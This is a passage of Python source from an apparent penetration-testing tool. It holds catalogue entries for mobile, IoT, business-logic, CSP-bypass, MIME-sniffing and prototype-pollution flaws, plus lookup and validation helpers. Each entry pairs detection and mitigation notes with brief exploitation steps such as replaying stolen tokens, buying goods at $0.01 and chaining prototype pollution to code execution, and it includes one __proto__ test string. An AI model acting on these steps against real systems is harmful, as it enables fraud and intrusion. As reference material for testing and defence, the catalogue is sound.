        "name": "Insecure Data Storage on Mobile",
        "category": "Mobile",
        "severity": "High",
        "description": (
            "App stores secrets in plaintext in SharedPreferences, "
            "NSUserDefaults, or SQLite."
        ),
        "detection": [
            "adb backup and unpack",
            "Check /data/data/<pkg>/shared_prefs/",
        ],
        "exploitation": [
            "Extract API tokens and session cookies",
            "Replay tokens against backend",
        ],
        "payloads": [],
        "mitigation": "Use Keystore/Keychain, encrypt at rest.",
        "references": ["OWASP MASVS-STORAGE"],
    },
    {
        "id": "mobile-api-exposure",
        "name": "Insecure Mobile API Endpoints",
        "category": "Mobile",
        "severity": "High",
        "description": (
            "Mobile app talks to APIs that trust the client for auth or "
            "business logic."
        ),
        "detection": [
            "jadx / Ghidra decompile the APK",
            "Bypass SSL pinning with Frida",
            "Capture traffic via mitmproxy",
        ],
        "exploitation": [
            "Enumerate hidden endpoints",
            "Extract hardcoded API keys",
            "Reverse a signature scheme",
        ],
        "payloads": [],
        "mitigation": "Server-side validation only, rotate keys, certificate pinning.",
        "references": ["OWASP MASVS-NETWORK"],
    },

    # ============================================================
    # 14. IOT
    # ============================================================
    {
        "id": "iot-default-creds",
        "name": "Weak IoT Authentication",
        "category": "IoT",
        "severity": "Critical",
        "description": (
            "Devices ship with fixed or predictable credentials."
        ),
        "detection": [
            "Test vendor defaults from public lists",
            "Test admin/admin, root/root, support/support",
        ],
        "exploitation": [
            "Log in as admin, upload firmware",
            "Extract device config with keys",
        ],
        "payloads": [],
        "mitigation": "Force unique password on first boot.",
        "references": ["OWASP IoT Top 10"],
    },
    {
        "id": "iot-firmware",
        "name": "Insecure Firmware / Update",
        "category": "IoT",
        "severity": "High",
        "description": (
            "Firmware updates not signed or fetched over HTTP."
        ),
        "detection": [
            "Extract firmware with binwalk and inspect for HTTP endpoints",
            "Fingerprint update protocol (HTTP vs HTTPS, signature checks)",
        ],
        "exploitation": [
            "MITM update, push custom firmware",
            "Extract hardcoded keys from firmware",
        ],
        "payloads": [],
        "mitigation": "Signed firmware, TLS with pinning, secure boot.",
        "references": ["OWASP IoT Top 10"],
    },

    # ============================================================
    # 15. BUSINESS LOGIC
    # ============================================================
    {
        "id": "price-manipulation",
        "name": "Price Manipulation",
        "category": "Business Logic",
        "severity": "High",
        "description": (
            "Client sends the price or quantity, and the server trusts it."
        ),
        "detection": [
            "Intercept checkout and change price to 0.01",
            "Test negative quantity for refund abuse",
        ],
        "exploitation": [
            "Buy items at $0.01",
            "Abuse refund logic for free goods",
        ],
        "payloads": [],
        "mitigation": "Compute price server-side from product id.",
        "references": ["OWASP Business Logic"],
    },
    {
        "id": "race-condition",
        "name": "Race Condition / TOCTOU",
        "category": "Business Logic",
        "severity": "High",
        "description": (
            "Two requests race on a shared resource."
        ),
        "detection": [
            "Send two parallel requests to the same state-changing endpoint",
            "Use Turbo Intruder single-packet attack for precision",
        ],
        "exploitation": [
            "Redeem coupon multiple times",
            "Reset password to attacker-chosen value",
            "Bypass withdrawal limit",
        ],
        "payloads": [],
        "mitigation": "Database-level locking, idempotency keys, atomic operations.",
        "references": ["PortSwigger Race Conditions"],
    },
    {
        "id": "account-enum",
        "name": "Account Enumeration",
        "category": "Business Logic",
        "severity": "Low",
        "description": (
            "Login and reset endpoints reveal whether an account exists."
        ),
        "detection": [
            "Send /login with valid vs invalid user and compare",
            "Measure timing difference between existing vs missing accounts",
        ],
        "exploitation": [
            "Enumerate all users for phishing or spraying",
        ],
        "payloads": [],
        "mitigation": "Uniform response and timing regardless of user existence.",
        "references": ["OWASP Authentication"],
    },

    # ============================================================
    # 16. CONTENT SPOOFING
    # ============================================================
    {
        "id": "csp-bypass",
        "name": "Content Security Policy Bypass",
        "category": "Content Spoofing",
        "severity": "High",
        "description": (
            "CSP is present but allows unsafe-inline, JSONP endpoints, or "
            "an unsafe CDN."
        ),
        "detection": [
            "Inspect CSP header for unsafe-inline or wildcards",
            "Enumerate JSONP endpoints on allowlisted hosts",
            "Test base-uri and frame-ancestors",
        ],
        "exploitation": [
            "Load JSONP on a trusted host to execute JS",
            "Chain with XSS sink to execute despite CSP",
        ],
        "payloads": ["xss-csp-bypass"],
        "mitigation": "CSP with nonce, no unsafe-inline, no wildcards.",
        "references": ["CSP Bypass research"],
    },
    {
        "id": "mime-sniffing",
        "name": "MIME Sniffing",
        "category": "Content Spoofing",
        "severity": "Medium",
        "description": (
            "Browser sniffs content type instead of trusting the declared one."
        ),
        "detection": [
            "Upload an HTML file with image content-type",
            "Check for X-Content-Type-Options: nosniff",
        ],
        "exploitation": [
            "Upload shell.html as image/png",
            "Chain with XSS to execute",
        ],
        "payloads": [],
        "mitigation": "X-Content-Type-Options: nosniff on every response.",
        "references": ["CWE-430"],
    },

    # ============================================================
    # 17. ZERO-DAY CLASS
    # ============================================================
    {
        "id": "zero-day-patterns",
        "name": "Zero-Day Attack Patterns",
        "category": "Zero-Day",
        "severity": "Critical",
        "description": (
            "No public CVE yet. Attacker chains known primitives into an "
            "unintended behaviour."
        ),
        "detection": [
            "Fuzz parsers and type coercion edges",
            "Differential analysis: browser vs server, one proxy vs another",
            "Static analysis of recently-changed code",
            "Behavioural diff between library versions",
        ],
        "exploitation": [
            "Assemble primitives into a working chain",
            "Bypass mitigations layer by layer",
            "Test on the exact target version, not latest",
        ],
        "payloads": [],
        "mitigation": "Patch fast, run bug bounty, use sandboxed parsers.",
        "references": ["Google Project Zero", "Pwn2Own writeups"],
    },
    {
        "id": "prototype-pollution",
        "name": "Prototype Pollution",
        "category": "Zero-Day",
        "severity": "High",
        "description": (
            "Attacker merges __proto__ or constructor.prototype into "
            "user-controlled objects, altering Object.prototype behaviour."
        ),
        "detection": [
            "Send {\"__proto__\":{\"test\":\"apex\"}} to merge endpoints",
            "Check for vulnerable merge/lodash functions",
        ],
        "exploitation": [
            "Pollute Object.prototype to bypass auth checks",
            "Chain with EJS / Handlebars gadgets for RCE",
        ],
        "payloads": ["proto-pollution-merge", "proto-pollution-ejs"],
        "mitigation": "Freeze Object.prototype, use Object.create(null), patch libraries.",
        "references": ["CWE-1321", "PortSwigger Prototype Pollution"],
    },
]


# ---------------------------------------------------------------------------
# Accessors
# ---------------------------------------------------------------------------

def all_vulnerabilities() -> List[Dict[str, Any]]:
    return list(VULNERABILITIES)


def by_category() -> Dict[str, List[Dict[str, Any]]]:
    out: Dict[str, List[Dict[str, Any]]] = {}
    for v in VULNERABILITIES:
        out.setdefault(v["category"], []).append(v)
    return out


def get(vuln_id: str) -> Optional[Dict[str, Any]]:
    for v in VULNERABILITIES:
        if v["id"] == vuln_id:
            return v
    return None


def search(keyword: str) -> List[Dict[str, Any]]:
    kw = (keyword or "").strip().lower()
    if not kw:
        return []
    tokens = kw.split()
    hits: List[Dict[str, Any]] = []
    for v in VULNERABILITIES:
        blob = " ".join([
            v.get("id", ""), v.get("name", ""), v.get("category", ""),
            v.get("description", ""), v.get("mitigation", ""),
            " ".join(v.get("detection", [])),
            " ".join(v.get("exploitation", [])),
        ]).lower()
        if all(t in blob for t in tokens):
            hits.append(v)
    return hits


def categories() -> List[str]:
    return sorted({v["category"] for v in VULNERABILITIES})


def total() -> int:
    return len(VULNERABILITIES)


# ---------------------------------------------------------------------------
# Data integrity helpers
# ---------------------------------------------------------------------------

VALID_CATEGORIES = {
    "Injection", "Broken Authentication", "Sensitive Data Exposure",
    "Security Misconfiguration", "XML-Related", "Broken Access Control",
    "Insecure Deserialization", "API Security", "Insecure Communication",
    "Client-Side", "Denial of Service", "SSRF", "Other Web", "Mobile",
    "IoT", "Business Logic", "Content Spoofing", "Zero-Day",
}

VALID_SEVERITIES = {"Critical", "High", "Medium", "Low", "Info"}


def validate_entries() -> List[str]:
    """Return a list of problems. Empty list means catalogue is well-formed."""
    problems: List[str] = []
    seen_ids: set = set()

    for v in VULNERABILITIES:
        vid = v.get("id", "")
        if not vid:
            problems.append("Entry with missing 'id'.")
            continue
        if vid in seen_ids:
            problems.append(f"Duplicate id: {vid}")
        seen_ids.add(vid)

        if v.get("category") not in VALID_CATEGORIES:
            problems.append(f"{vid}: invalid category {v.get('category')!r}")
        if v.get("severity") not in VALID_SEVERITIES:
            problems.append(f"{vid}: invalid severity {v.get('severity')!r}")
        if not (v.get("name") or "").strip():
            problems.append(f"{vid}: missing name")
        if not (v.get("description") or "").strip():
            problems.append(f"{vid}: missing description")
        if not (v.get("mitigation") or "").strip():
            problems.append(f"{vid}: missing mitigation")
        if not isinstance(v.get("detection"), list):
            problems.append(f"{vid}: detection must be a list")
        if not isinstance(v.get("exploitation"), list):
            problems.append(f"{vid}: exploitation must be a list")
        if not isinstance(v.get("payloads"), list):
            problems.append(f"{vid}: payloads must be a list")
        if not isinstance(v.get("references", []), list):
            problems.append(f"{vid}: references must be a list")

    return problems


def validate_payload_references() -> Dict[str, List[str]]:
    """Return a mapping of vuln_id -> list of dangling payload ids."""
    try:
        from apex_payload import get as payload_get
    except ImportError:
        return {}

    dangling: Dict[str, List[str]] = {}
    for v in VULNERABILITIES:
        bad = [p for p in v.get("payloads", []) if payload_get(p) is None]
        if bad:
            dangling[v["id"]] = bad
    return dangling
